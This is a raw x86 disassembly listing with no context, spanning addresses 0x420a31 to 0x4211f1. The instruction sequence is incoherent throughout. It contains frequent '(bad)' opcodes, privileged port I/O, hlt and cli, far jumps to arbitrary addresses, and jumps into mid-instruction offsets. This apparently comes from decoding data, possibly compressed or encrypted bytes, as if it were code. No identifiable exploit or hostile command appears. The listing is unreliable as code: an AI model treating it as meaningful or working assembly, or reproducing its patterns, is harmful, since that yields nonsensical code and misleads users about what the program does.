  420a31:	cli    
  420a32:	daa    
  420a33:	adc    eax,0x9d82db3a
  420a38:	fucomp st(4)
  420a3a:	xchg   edi,eax
  420a3b:	and    DWORD PTR [ecx],edx
  420a3d:	mov    BYTE PTR [edi],0x6
  420a40:	jl     0x420a56
  420a42:	xchg   BYTE PTR [ebp-0x2d9c0146],ch
  420a48:	sbb    al,0xf0
  420a4a:	pushf  
  420a4b:	dec    ecx
  420a4c:	fstp   DWORD PTR [edx+0x371f7e1a]
  420a52:	xor    eax,esp
  420a54:	pop    esp
  420a55:	jbe    0x420aa0
  420a57:	shl    DWORD PTR [esi-0x495ee225],1
  420a5d:	cmp    BYTE PTR [edi+0x33],bh
  420a60:	xlat   BYTE PTR ds:[ebx]
  420a61:	jnp    0x420ade
  420a63:	daa    
  420a64:	dec    esi
  420a65:	mov    ebx,0x59416bbb
  420a6a:	jmp    0x4209f4
  420a6c:	or     DWORD PTR [ebp+esi*4-0x4d],0xffffffa5
  420a71:	out    dx,eax
  420a72:	sub    eax,0xf9ca2885
  420a77:	and    ebx,ebp
  420a79:	dec    ecx
  420a7a:	pop    ebx
  420a7b:	jns    0x420abe
  420a7d:	ds sbb eax,0x938ada2e
  420a83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a84:	cmp    esi,ebx
  420a86:	push   esp
  420a87:	or     BYTE PTR [ecx-0x23e7a9f1],0x11
  420a8e:	or     ebx,edi
  420a90:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  420a92:	retf   0x328d
  420a95:	ds nop
  420a97:	(bad)  
  420a98:	not    ebx
  420a9a:	(bad)  
  420a9b:	pop    edi
  420a9c:	stos   DWORD PTR es:[edi],eax
  420a9d:	xor    al,0xb6
  420a9f:	xchg   esi,eax
  420aa0:	dec    ebx
  420aa1:	and    ebp,edx
  420aa3:	push   esi
  420aa4:	xchg   ecx,eax
  420aa5:	xchg   edx,eax
  420aa6:	sub    DWORD PTR [esi-0x7b],ecx
  420aa9:	stos   DWORD PTR es:[edi],eax
  420aaa:	retf   0xa547
  420aad:	mov    eax,esi
  420aaf:	push   esp
  420ab0:	dec    DWORD PTR [ebp-0x15338d14]
  420ab6:	or     eax,0x892ed99
  420abb:	outs   dx,BYTE PTR ds:[esi]
  420abc:	add    eax,0xdac95161
  420ac1:	mov    bh,0x2
  420ac3:	jecxz  0x420b03
  420ac5:	sub    esp,DWORD PTR [eax+0x4768fc40]
  420acb:	das    
  420acc:	push   ds
  420acd:	out    0x30,al
  420acf:	hlt    
  420ad0:	lea    edx,[ebp-0x54b264b1]
  420ad6:	lods   al,BYTE PTR ds:[esi]
  420ad7:	cld    
  420ad8:	repz popf 
  420ada:	add    esp,DWORD PTR [edx+0x6fcd034b]
  420ae0:	call   0x2a7b:0xf627e310
  420ae7:	mov    BYTE PTR [eax+0x3c25cfb4],cl
  420aed:	nop
  420aee:	mov    esp,0xa177d064
  420af3:	sub    eax,0x220c8ffd
  420af8:	inc    ebx
  420af9:	cmp    al,0x18
  420afb:	rcl    BYTE PTR [esi],1
  420afd:	ins    BYTE PTR es:[edi],dx
  420afe:	jge    0x420b01
  420b00:	loopne 0x420b02
  420b02:	das    
  420b03:	ja     0x420b74
  420b05:	lock int3 
  420b07:	mov    ds:0xa242e436,al
  420b0c:	sbb    eax,0xf764602d
  420b11:	nop
  420b12:	and    BYTE PTR [eax+0x658c5b16],0x35
  420b19:	xlat   BYTE PTR ds:[ebx]
  420b1a:	cmp    eax,0x285759ec
  420b1f:	push   0x7663eaa3
  420b24:	stos   DWORD PTR es:[edi],eax
  420b25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b26:	enter  0x7f53,0x65
  420b2a:	adc    edi,DWORD PTR [ecx-0x5ac9758a]
  420b30:	pop    ss
  420b31:	push   0x212c0cc1
  420b36:	data16 in al,0x6b
  420b39:	pop    ds
  420b3a:	rcr    BYTE PTR [esi],0xc0
  420b3d:	sbb    al,0xef
  420b3f:	sahf   
  420b40:	imul   ebp,DWORD PTR [ebp+0x3e],0x19
  420b44:	inc    edi
  420b45:	dec    eax
  420b46:	push   0x4404156b
  420b4b:	cld    
  420b4c:	mov    ecx,0xa6cca36a
  420b51:	pushf  
  420b52:	xchg   ebx,eax
  420b53:	or     cl,ch
  420b55:	aas    
  420b56:	sbb    DWORD PTR [ecx+0x63105f64],ecx
  420b5c:	dec    ebx
  420b5d:	in     al,dx
  420b5e:	jl     0x420ba5
  420b60:	jl     0x420b2e
  420b62:	sub    DWORD PTR [ebp+eax*1+0x64159b20],eax
  420b69:	mov    cl,dl
  420b6b:	push   cs
  420b6c:	lahf   
  420b6d:	add    ecx,eax
  420b6f:	pop    ebx
  420b70:	inc    ecx
  420b71:	add    al,0x5f
  420b73:	sbb    eax,0x9bb71d8c
  420b78:	dec    eax
  420b79:	popa   
  420b7a:	push   ebp
  420b7b:	enter  0xa187,0xc8
  420b7f:	xchg   edx,eax
  420b80:	push   edx
  420b81:	in     al,0x4e
  420b83:	pop    ecx
  420b84:	leave  
  420b85:	not    bh
  420b87:	dec    esp
  420b88:	pop    es
  420b89:	ins    DWORD PTR es:[edi],dx
  420b8a:	cli    
  420b8b:	ret    0xcbb3
  420b8e:	cmc    
  420b8f:	and    DWORD PTR [esi-0x37],eax
  420b92:	ja     0x420bd4
  420b94:	inc    edi
  420b95:	inc    esi
  420b96:	test   DWORD PTR [eax+edx*4],edi
  420b99:	in     eax,0xa2
  420b9b:	ret    
  420b9c:	out    dx,eax
  420b9d:	sbb    BYTE PTR [ecx],dh
  420b9f:	test   esi,esp
  420ba1:	js     0x420b7f
  420ba3:	mov    edx,0x30acf497
  420ba8:	aaa    
  420ba9:	adc    dh,ch
  420bab:	mov    bh,0xa7
  420bad:	call   0xcdd2baa5
  420bb2:	in     eax,dx
  420bb3:	ins    DWORD PTR es:[edi],dx
  420bb4:	mov    bl,0xb3
  420bb6:	aad    0xad
  420bb8:	xchg   DWORD PTR [ebx-0x52],esp
  420bbb:	aaa    
  420bbc:	sbb    ah,al
  420bbe:	mov    cl,ah
  420bc0:	jo     0x420b55
  420bc2:	push   esi
  420bc3:	sub    BYTE PTR [edi],dl
  420bc5:	outs   dx,BYTE PTR ds:[esi]
  420bc6:	icebp  
  420bc7:	or     eax,0xefe8189f
  420bcc:	outs   dx,BYTE PTR ds:[esi]
  420bcd:	ins    BYTE PTR es:[edi],dx
  420bce:	call   DWORD PTR [ebx]
  420bd0:	pop    edx
  420bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bd2:	push   0x8fe7350c
  420bd7:	retf   
  420bd8:	xchg   esp,eax
  420bd9:	mov    bl,0x95
  420bdb:	loope  0x420b6a
  420bdd:	jae    0x420bf9
  420bdf:	mov    esi,0x1db51a61
  420be4:	or     al,0xe8
  420be6:	jmp    0x15383025
  420beb:	repnz popf 
  420bed:	cmp    eax,0x3facc38d
  420bf2:	(bad)  
  420bf3:	jg     0x420b9f
  420bf5:	sub    eax,0xbdc33743
  420bfa:	lea    esp,[esi+0x6cab4e85]
  420c00:	push   0x4b
  420c02:	in     eax,dx
  420c03:	xor    BYTE PTR [esi+0x2849a2ed],bl
  420c09:	mov    al,0x23
  420c0b:	sbb    bl,BYTE PTR [ebx+0x2e740db6]
  420c11:	adc    esi,DWORD PTR [edx+ebx*2-0x2216a7fb]
  420c18:	cmp    al,0x3e
  420c1a:	mov    ebx,DWORD PTR [edi]
  420c1c:	call   0xb01a:0x88a15859
  420c23:	sbb    ebp,DWORD PTR [ebp+0x6e]
  420c26:	fwait
  420c27:	(bad)
  420c2b:	(bad)  
  420c2c:	and    BYTE PTR [esp+ecx*4],dl
  420c2f:	ins    DWORD PTR es:[edi],dx
  420c30:	addr16 dec ebx
  420c32:	test   DWORD PTR [eax-0x3619d0a0],ebp
  420c38:	inc    ebp
  420c39:	adc    BYTE PTR gs:[ebx-0xedcb863],0x98
  420c41:	jmp    0xd8f7ed4b
  420c46:	js     0x420c90
  420c48:	or     BYTE PTR [esi-0x7e],dl
  420c4b:	inc    ecx
  420c4c:	xor    edx,DWORD PTR [ecx]
  420c4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c4f:	in     al,dx
  420c50:	add    DWORD PTR [esi],0xdeee095e
  420c56:	dec    ebx
  420c57:	loope  0x420ca8
  420c59:	jmp    0x420c7f
  420c5b:	xchg   esp,eax
  420c5c:	test   DWORD PTR ds:0x46624b96,edi
  420c62:	pushf  
  420c63:	dec    edx
  420c64:	pop    esp
  420c65:	lds    ecx,FWORD PTR [ebx-0x6b4bde9d]
  420c6b:	xchg   esi,eax
  420c6c:	repz adc al,0x3b
  420c6f:	loop   0x420cd2
  420c71:	xor    eax,DWORD PTR [esi]
  420c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c74:	push   ss
  420c75:	mov    esi,0xc3e32791
  420c7a:	inc    ebp
  420c7b:	fldcw  WORD PTR [eax+0x744d3106]
  420c81:	and    dl,BYTE PTR [edx-0x4f829b7e]
  420c87:	inc    edx
  420c88:	push   ss
  420c89:	push   ebp
  420c8a:	and    BYTE PTR [ebx+0x1052779a],al
  420c90:	or     BYTE PTR [ebx-0x7ccdb27d],bh
  420c96:	push   ebx
  420c97:	dec    edx
  420c98:	fwait
  420c99:	pop    esp
  420c9a:	pop    esp
  420c9b:	cmc    
  420c9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c9d:	mov    ecx,DWORD PTR [ecx]
  420c9f:	aas    
  420ca0:	xor    eax,0x60dcdad8
  420ca5:	in     eax,dx
  420ca6:	addr16 mov ds:0x7cd0,al
  420caa:	call   0x6d5efe92
  420caf:	ret    0x19bb
  420cb2:	xchg   edi,eax
  420cb3:	dec    ebp
  420cb4:	cwde   
  420cb5:	xchg   BYTE PTR [ecx-0x7484eb44],ch
  420cbb:	ret    
  420cbc:	mov    ah,0xa8
  420cbe:	stos   DWORD PTR es:[edi],eax
  420cbf:	cdq    
  420cc0:	inc    ecx
  420cc1:	cli    
  420cc2:	add    esi,esp
  420cc4:	out    dx,al
  420cc5:	mov    edi,0x52a5f730
  420cca:	pop    ecx
  420ccb:	add    al,0x9c
  420ccd:	xor    DWORD PTR [eiz*4-0x207e42d0],0xd68bd68
  420cd8:	(bad)  
  420cd9:	lds    ebx,FWORD PTR gs:[eax]
  420cdc:	pop    edi
  420cdd:	outs   dx,BYTE PTR ds:[esi]
  420cde:	inc    edx
  420cdf:	sub    dl,ch
  420ce1:	mov    esp,0xf0d082b8
  420ce6:	or     DWORD PTR [ecx+0x49551c6b],0xffffff89
  420ced:	pop    edx
  420cee:	sub    al,0xd8
  420cf0:	ret    
  420cf1:	add    eax,DWORD PTR [edi-0x66]
  420cf4:	aaa    
  420cf5:	mov    ch,0x23
  420cf7:	lahf   
  420cf8:	add    eax,0x6402efd5
  420cfd:	jmp    0xb903:0xc1a415e9
  420d04:	push   es
  420d05:	lods   eax,DWORD PTR ds:[esi]
  420d06:	mov    ebx,0x1770b5fc
  420d0b:	call   FWORD PTR [ebx-0x5c]
  420d0e:	lock in eax,dx
  420d10:	mov    ecx,0x90fad1b2
  420d15:	enter  0xf9f7,0x28
  420d19:	shr    BYTE PTR [ebp*2-0x2b1e642b],1
  420d20:	inc    edx
  420d21:	in     al,0xe4
  420d23:	xchg   ecx,eax
  420d24:	adc    eax,0xfaad752
  420d29:	cmc    
  420d2a:	or     bh,BYTE PTR [edi-0x4ba1220e]
  420d30:	repnz xchg esi,eax
  420d32:	adc    eax,0x523c467
  420d37:	mov    WORD PTR ds:0x7b2617ad,cs
  420d3d:	fidiv  DWORD PTR [esi+0x75]
  420d40:	mov    dl,0x17
  420d42:	mov    ebp,0x928bb7b7
  420d47:	dec    ebp
  420d48:	aas    
  420d49:	jmp    0x420d1b
  420d4b:	dec    edi
  420d4c:	jg     0x420dbf
  420d4e:	cwde   
  420d4f:	inc    ecx
  420d50:	inc    esi
  420d51:	push   edx
  420d52:	xchg   ecx,eax
  420d53:	pusha  
  420d54:	lahf   
  420d55:	cmp    BYTE PTR [edx],ch
  420d57:	scas   eax,DWORD PTR es:[edi]
  420d58:	inc    BYTE PTR [edx-0x708c9ab1]
  420d5e:	add    al,0x75
  420d60:	jle    0x420d75
  420d62:	fidiv  DWORD PTR [esi]
  420d64:	repnz push edi
  420d66:	js     0x420d09
  420d68:	out    0x55,eax
  420d6a:	cmp    BYTE PTR [ebx],0x61
  420d6d:	ja     0x420d3b
  420d6f:	loope  0x420dd0
  420d71:	inc    esi
  420d72:	and    dh,BYTE PTR [edi]
  420d74:	jno    0x420d55
  420d76:	dec    eax
  420d77:	jne    0x420d3d
  420d79:	sbb    DWORD PTR [ecx+0x46],ebx
  420d7c:	cmp    BYTE PTR [esi],ch
  420d7e:	mov    ah,0x21
  420d80:	push   0xffffffe8
  420d82:	or     DWORD PTR [edx-0x74],edx
  420d85:	jecxz  0x420d7f
  420d87:	test   ebp,edi
  420d89:	mov    edx,0xea909843
  420d8e:	loop   0x420dac
  420d90:	fstp   TBYTE PTR [edx-0xc9745cc]
  420d96:	nop
  420d97:	mov    ebp,0xbb8236a0
  420d9c:	mov    edx,0x8b72c2c
  420da1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420da2:	je     0x420d63
  420da4:	adc    ebp,DWORD PTR [esi]
  420da6:	mov    ds:0x97faf9b0,al
  420dab:	sub    al,0x2a
  420dad:	sub    ebp,DWORD PTR [esi]
  420daf:	jmp    0xd1a6:0xbe1747d0
  420db6:	xlat   BYTE PTR ds:[ebx]
  420db7:	outs   dx,DWORD PTR ds:[esi]
  420db8:	xor    BYTE PTR [esi],dl
  420dba:	mov    ds:0x48ab217a,eax
  420dbf:	fbld   TBYTE PTR [ecx+esi*8+0x76f8dd86]
  420dc6:	fwait
  420dc7:	or     bh,bl
  420dc9:	dec    ebx
  420dca:	push   0xe1144617
  420dcf:	adc    DWORD PTR [edx-0x1fcff47f],esi
  420dd5:	jno    0x420e4c
  420dd7:	dec    eax
  420dd8:	push   edi
  420dd9:	hlt    
  420dda:	fld    DWORD PTR [edx-0x12b822d6]
  420de0:	imul   esi,ebx,0xbc2044bc
  420de6:	fucomi st,st(4)
  420de8:	or     ch,cl
  420dea:	neg    DWORD PTR [ebx-0x61]
  420ded:	leave  
  420dee:	mov    dl,0xe7
  420df0:	jbe    0x420dcd
  420df2:	xchg   esi,eax
  420df3:	push   ds
  420df4:	shl    BYTE PTR [ecx],1
  420df6:	pop    eax
  420df7:	jbe    0x420dd5
  420df9:	leave  
  420dfa:	inc    eax
  420dfb:	fnstsw WORD PTR [ebx]
  420dfd:	xchg   edi,eax
  420dfe:	dec    ecx
  420dff:	dec    eax
  420e00:	sub    DWORD PTR [ebx],ecx
  420e02:	add    bl,BYTE PTR [esi-0x6c]
  420e05:	jo     0x420df4
  420e07:	jo     0x420de9
  420e09:	cmc    
  420e0a:	mov    ebp,0xba657ad8
  420e0f:	or     dh,BYTE PTR [ecx]
  420e11:	daa    
  420e12:	xchg   ecx,eax
  420e13:	aam    0xf9
  420e15:	repz popa 
  420e17:	call   DWORD PTR [esi]
  420e19:	call   0xcef8c1c9
  420e1e:	int3   
  420e1f:	add    ah,BYTE PTR [eax]
  420e21:	pop    ebp
  420e22:	std    
  420e23:	xchg   BYTE PTR [ebx],al
  420e25:	cli    
  420e26:	push   edi
  420e27:	mov    bh,0xfb
  420e29:	retf   
  420e2a:	add    DWORD PTR [ebx],esi
  420e2c:	mov    ds:0x96c9bfa,eax
  420e31:	ds adc edx,ebp
  420e34:	leave  
  420e35:	xchg   esp,eax
  420e36:	(bad)  
  420e37:	fcom   QWORD PTR [edi-0x2d79f231]
  420e3d:	mov    bl,0xc
  420e3f:	adc    dh,BYTE PTR [esi-0x43]
  420e42:	repnz mov ecx,0xccbd9305
  420e48:	inc    esp
  420e49:	add    ah,ah
  420e4b:	in     al,0x16
  420e4d:	sub    eax,0xf70ff39b
  420e52:	xchg   ebp,eax
  420e53:	mov    al,0x24
  420e55:	icebp  
  420e56:	xor    ch,BYTE PTR [edi+0x25618493]
  420e5c:	das    
  420e5d:	mov    ds:0x99d9c6a,eax
  420e62:	out    dx,al
  420e63:	dec    ebp
  420e64:	push   edi
  420e65:	or     DWORD PTR [ebp+0x2d],eax
  420e68:	ficomp WORD PTR [eax-0x6d]
  420e6b:	inc    esp
  420e6c:	scas   al,BYTE PTR es:[edi]
  420e6d:	es in  eax,0xb9
  420e70:	stos   BYTE PTR es:[edi],al
  420e71:	mov    ds:0xabc0b6f9,eax
  420e76:	adc    DWORD PTR [ebp+0x24],ecx
  420e79:	mov    bh,0x11
  420e7b:	inc    ecx
  420e7c:	cmp    cl,ah
  420e7e:	dec    edx
  420e7f:	add    eax,0xe62789d
  420e84:	neg    BYTE PTR [esi+0x59]
  420e87:	test   eax,0xd053d11
  420e8c:	pop    ss
  420e8d:	mov    ds:0xd32fa2d9,eax
  420e92:	int3   
  420e93:	mov    edx,0x96ecb515
  420e98:	icebp  
  420e99:	loop   0x420eb7
  420e9b:	pusha  
  420e9c:	mov    ah,0x43
  420e9e:	clc    
  420e9f:	ror    DWORD PTR [eax*2+0x705c73f9],1
  420ea6:	(bad)  
  420ea7:	jne    0x420e82
  420ea9:	push   es
  420eaa:	xlat   BYTE PTR ds:[ebx]
  420eab:	mov    esp,esp
  420ead:	je     0x420e80
  420eaf:	sbb    ebp,DWORD PTR [bx+0x1a2e]
  420eb4:	cli    
  420eb5:	xchg   DWORD PTR [edi-0x76],ebp
  420eb8:	jmp    0x420ed3
  420eba:	mov    ds:0xf1b7986f,eax
  420ebf:	push   0xffffffd4
  420ec1:	jl     0x420f3a
  420ec3:	mov    esp,0xadd5f29c
  420ec8:	sbb    bl,al
  420eca:	popf   
  420ecb:	sbb    eax,0xf208e128
  420ed0:	pop    eax
  420ed1:	(bad)  
  420ed2:	lock dec ecx
  420ed4:	shr    edi,0x9e
  420ed7:	les    ebp,FWORD PTR [ebx]
  420ed9:	(bad)
  420edd:	xchg   esi,eax
  420ede:	mov    bh,0xca
  420ee0:	xchg   ecx,eax
  420ee1:	cld    
  420ee2:	cmp    DWORD PTR [esi],0x937d91ec
  420ee8:	stc    
  420ee9:	adc    DWORD PTR [ebx-0x5f],0x493e662e
  420ef0:	jne    0x420ea2
  420ef2:	mov    al,0x41
  420ef4:	test   BYTE PTR [edi+0x7b052bbb],al
  420efa:	xor    BYTE PTR [esi+0x433e83a5],bl
  420f00:	xchg   ebx,eax
  420f01:	test   BYTE PTR [ebp+0x634a32dd],bh
  420f07:	xlat   BYTE PTR ds:[ebx]
  420f08:	dec    esi
  420f09:	cmp    dl,bh
  420f0b:	mov    bh,0x8f
  420f0d:	xchg   ecx,eax
  420f0e:	or     edx,DWORD PTR [eax+0x3aaff1eb]
  420f14:	xchg   ebp,eax
  420f15:	(bad)  
  420f16:	jl     0x420ead
  420f18:	xor    BYTE PTR [esi-0x5f],0xc7
  420f1c:	test   al,0x6a
  420f1e:	mov    ecx,edx
  420f20:	sbb    ebp,eax
  420f22:	or     ecx,DWORD PTR [eax]
  420f24:	cdq    
  420f25:	mov    ch,0x56
  420f27:	outs   dx,DWORD PTR ds:[esi]
  420f28:	lds    ecx,FWORD PTR [eax]
  420f2a:	mov    al,ah
  420f2c:	imul   edi,DWORD PTR [edi-0x5b423ba2],0x40
  420f33:	add    ch,BYTE PTR [esi+0x13]
  420f36:	or     ebx,DWORD PTR ds:0x24fb72a
  420f3c:	ja     0x420ebf
  420f3e:	jp     0x420f19
  420f40:	mov    al,ds:0xc2c7230
  420f45:	push   eax
  420f46:	jo     0x420f54
  420f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f49:	(bad)  
  420f4a:	mov    eax,ds:0x571cd9bf
  420f4f:	cmovle ecx,DWORD PTR [esp+eiz*8+0x2a]
  420f54:	idiv   DWORD PTR [ebx]
  420f56:	(bad)  
  420f57:	addr16 add al,0xf4
  420f5b:	push   es
  420f5c:	sbb    bl,BYTE PTR [eax-0x53838892]
  420f62:	dec    edx
  420f63:	jmp    0x420fd4
  420f65:	pop    ebp
  420f66:	jecxz  0x420f85
  420f68:	fiadd  WORD PTR [ebx-0x48]
  420f6b:	ins    DWORD PTR es:[edi],dx
  420f6c:	je     0x420f86
  420f6e:	mov    BYTE PTR [edi+0x5189e7],bh
  420f74:	mov    esp,edx
  420f76:	jl     0x420fdd
  420f78:	je     0x420f04
  420f7a:	add    dh,cl
  420f7c:	imul   ecx,DWORD PTR [eax+0x6f],0x7b
  420f80:	adc    bh,BYTE PTR [ecx-0x58176907]
  420f86:	std    
  420f87:	(bad)  
  420f88:	lock test al,0xc0
  420f8b:	jno    0x420f6d
  420f8d:	call   esp
  420f8f:	adc    BYTE PTR [eax+ebp*1-0x1f],ch
  420f93:	ja     0x420f31
  420f95:	jno    0x420fec
  420f97:	mov    ebx,esi
  420f99:	push   eax
  420f9a:	into   
  420f9b:	fidivr DWORD PTR [edx-0xf]
  420f9e:	fpatan 
  420fa0:	(bad)  
  420fa1:	push   esi
  420fa2:	mul    BYTE PTR [esi+0x738bc466]
  420fa8:	fst    DWORD PTR ds:0xf4f95dec
  420fae:	sbb    al,0x9f
  420fb0:	sub    eax,0x473c2544
  420fb5:	sbb    DWORD PTR [esi-0x69],ebp
  420fb8:	adc    eax,0xfab66b77
  420fbd:	and    dh,BYTE PTR [ebx+0x6a]
  420fc0:	out    0x1b,al
  420fc2:	bound  ecx,QWORD PTR [eax+edi*8+0x5047e8a]
  420fc9:	bound  esp,QWORD PTR [ebx+0x6e50fa09]
  420fcf:	mov    dl,0xe4
  420fd1:	pop    edx
  420fd2:	jno    0x420fe8
  420fd4:	clc    
  420fd5:	mov    ah,0x71
  420fd7:	lahf   
  420fd8:	repz std 
  420fda:	pop    ss
  420fdb:	mov    ah,0x98
  420fdd:	ret    
  420fde:	pop    esp
  420fdf:	mov    al,ds:0x44602f28
  420fe4:	iret   
  420fe5:	mov    ss,edx
  420fe7:	cmp    eax,0x4095e9e6
  420fec:	and    BYTE PTR [ebp-0xc8696f5],al
  420ff2:	sar    BYTE PTR [esi-0x4e],cl
  420ff5:	mov    al,ds:0xc71dacb2
  420ffa:	out    dx,eax
  420ffb:	mov    ds,WORD PTR [ebp-0x61]
  420ffe:	and    ch,BYTE PTR [edx-0x63]
  421001:	jl     0x420ff8
  421003:	fdivr  st(5),st
  421005:	jmp    0x420fcb
  421007:	sub    eax,0xeffa89e0
  42100c:	dec    ebp
  42100d:	jb     0x421062
  42100f:	icebp  
  421010:	ja     0x42105c
  421012:	lds    ebx,FWORD PTR ss:[ebx-0x68e1f8c3]
  421019:	out    0xe8,al
  42101b:	pop    es
  42101c:	push   esi
  42101d:	cmp    ah,BYTE PTR [ebx]
  42101f:	push   eax
  421020:	adc    BYTE PTR [edx-0x6c],0x1
  421024:	icebp  
  421025:	xchg   esi,eax
  421026:	inc    esi
  421027:	gs mov bl,bl
  42102a:	pop    es
  42102b:	(bad)  
  42102c:	test   eax,0xfc75a4fa
  421031:	out    dx,eax
  421032:	cmp    ah,BYTE PTR [ebx-0x1a]
  421035:	jnp    0x421011
  421037:	in     al,0xc7
  421039:	mov    edi,0x8af9fce8
  42103e:	mov    dh,0x1c
  421040:	into   
  421041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421042:	mov    dh,0x9
  421044:	rol    dh,0xfe
  421047:	adc    ebx,DWORD PTR ds:0x84a56a45
  42104d:	mov    bl,0xf6
  42104f:	xor    dh,BYTE PTR [edi-0x44]
  421052:	pusha  
  421053:	std    
  421054:	stc    
  421055:	xor    BYTE PTR [ecx],bl
  421057:	and    eax,ebp
  421059:	imul   edi,esp,0x5ba00f06
  42105f:	ds dec eax
  421061:	inc    esi
  421062:	mov    ah,0x79
  421064:	xlat   BYTE PTR ds:[ebx]
  421065:	iret   
  421066:	push   es
  421067:	dec    edx
  421068:	and    al,0xfe
  42106a:	sbb    eax,0x9b3d17b0
  42106f:	xchg   ch,al
  421071:	test   al,0x46
  421073:	stos   BYTE PTR es:[edi],al
  421074:	add    BYTE PTR [eax],dl
  421076:	in     al,dx
  421077:	push   ss
  421078:	push   0x3dc931cd
  42107d:	push   esp
  42107e:	cwde   
  42107f:	mov    ebp,ecx
  421081:	fld    DWORD PTR [eax+0x61c8efa]
  421087:	jp     0x42107d
  421089:	xchg   ebp,eax
  42108a:	and    eax,0x598b2947
  42108f:	pop    es
  421090:	inc    esp
  421091:	ds in  al,0x34
  421094:	test   DWORD PTR [ebx-0x45147725],ecx
  42109a:	mov    eax,0x20bb3a38
  42109f:	ss dec ebx
  4210a1:	retf   0x5d77
  4210a4:	push   cs
  4210a5:	loop   0x4210d3
  4210a7:	in     al,dx
  4210a8:	in     al,dx
  4210a9:	(bad)  
  4210aa:	cdq    
  4210ab:	dec    eax
  4210ac:	fcmovnu st,st(5)
  4210ae:	cmp    esi,DWORD PTR [ecx-0x4d]
  4210b1:	int3   
  4210b2:	push   es
  4210b3:	dec    eax
  4210b4:	cmp    ecx,DWORD PTR [edi+0x56bf82a1]
  4210ba:	mov    esi,0x607fb074
  4210bf:	sub    BYTE PTR [ebp-0x18],bh
  4210c2:	pusha  
  4210c3:	mov    bl,0x27
  4210c5:	pop    esi
  4210c6:	scas   al,BYTE PTR es:[edi]
  4210c7:	fistp  DWORD PTR [edx-0x69a2f38d]
  4210cd:	lods   al,BYTE PTR ds:[esi]
  4210ce:	(bad)  
  4210cf:	fdiv   st(5),st
  4210d1:	add    DWORD PTR [esi],0x1b
  4210d4:	out    dx,eax
  4210d5:	dec    esi
  4210d6:	add    eax,ebx
  4210d8:	and    al,0x3f
  4210da:	jecxz  0x421097
  4210dc:	mov    esp,0xf87c2c2d
  4210e1:	xchg   DWORD PTR [edi+0x1ed74f66],edx
  4210e7:	lea    eax,[edx+0x34]
  4210ea:	imul   edi,DWORD PTR [ecx-0x20f438d4],0x20031f2e
  4210f4:	mov    esi,0xc417fd07
  4210f9:	fdiv   DWORD PTR ds:0xcc4f4ea1
  4210ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421100:	test   DWORD PTR [esi],0x9e90445e
  421106:	xor    BYTE PTR [ebx+esi*1],cl
  421109:	adc    ebx,esp
  42110b:	add    DWORD PTR [edx],ebp
  42110d:	and    ebx,ebp
  42110f:	cmp    edx,DWORD PTR [edx-0x4571048f]
  421115:	xor    BYTE PTR [ecx-0x2e],0x4a
  421119:	aaa    
  42111a:	pop    ecx
  42111b:	aaa    
  42111c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42111d:	sbb    eax,0xa5189dad
  421122:	test   eax,0x8af1cff0
  421127:	loopne 0x421172
  421129:	fldenv [eax+edx*4-0x7a]
  42112d:	sbb    al,BYTE PTR [ebp-0x3e43f6e3]
  421133:	fild   WORD PTR [edx]
  421135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421136:	pop    es
  421137:	daa    
  421138:	adc    eax,0x81eb9298
  42113d:	mov    ds:0xa7b1a22d,eax
  421142:	loope  0x421153
  421144:	cmp    edx,esi
  421146:	add    DWORD PTR [eax],ecx
  421148:	loop   0x42116a
  42114a:	sbb    DWORD PTR cs:[edi+ecx*2-0x5629bb42],ecx
  421152:	aaa    
  421153:	mov    bh,0x79
  421155:	inc    ebp
  421156:	sbb    DWORD PTR [edi],esp
  421158:	jle    0x421198
  42115a:	fisttp WORD PTR ds:0xf1469a8d
  421160:	inc    edx
  421161:	mov    edi,ebx
  421163:	loope  0x421105
  421165:	int    0xb4
  421167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421168:	adc    al,0x6a
  42116a:	mov    DWORD PTR [edx+0x409361a8],ecx
  421170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421171:	shr    bl,0x81
  421174:	hlt    
  421175:	mov    eax,ds:0x39e85aee
  42117a:	xor    BYTE PTR ds:0xc8446ed1,bh
  421180:	lods   eax,DWORD PTR ds:[esi]
  421181:	cmp    bh,ch
  421183:	xchg   ecx,eax
  421184:	xchg   ecx,eax
  421185:	fcom   QWORD PTR [esi+0x381fe827]
  42118b:	(bad)  
  42118c:	in     al,0xc3
  42118e:	dec    edi
  42118f:	push   ecx
  421190:	xor    al,0x2
  421192:	or     edx,DWORD PTR ds:0xe4e3efa3
  421198:	cmp    bh,BYTE PTR [ebp-0x7d5dc2f8]
  42119e:	stc    
  42119f:	cdq    
  4211a0:	sub    ah,BYTE PTR [edx-0x38ca8fe6]
  4211a6:	cmp    ebx,ebx
  4211a8:	rol    ch,1
  4211aa:	rcl    bh,1
  4211ac:	sbb    DWORD PTR [edx],0x40d58f65
  4211b2:	stc    
  4211b3:	dec    ebp
  4211b4:	jle    0x421224
  4211b6:	mov    ds:0xdac1dc4a,eax
  4211bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211bc:	aad    0xaa
  4211be:	aad    0xfd
  4211c0:	aad    0xcc
  4211c2:	std    
  4211c3:	adc    BYTE PTR [esi-0x71],al
  4211c6:	add    ecx,DWORD PTR [esi+0x53cb064e]
  4211cc:	dec    ebx
  4211cd:	mov    ecx,0x93231cc5
  4211d2:	repz pusha 
  4211d4:	leave  
  4211d5:	call   0x1a4b67ab
  4211da:	rcl    DWORD PTR [edi+eax*8+0x60],cl
  4211de:	push   0x1d
  4211e0:	mov    dl,0x41
  4211e2:	pop    ss
  4211e3:	out    dx,al
  4211e4:	and    dh,dl
  4211e6:	addr16 jnp 0x42118c
  4211e9:	add    ah,BYTE PTR [edi+0x7edfe877]
  4211ef:	out    0xc6,al
  4211f1:	mov    ds:0x236568ef,al
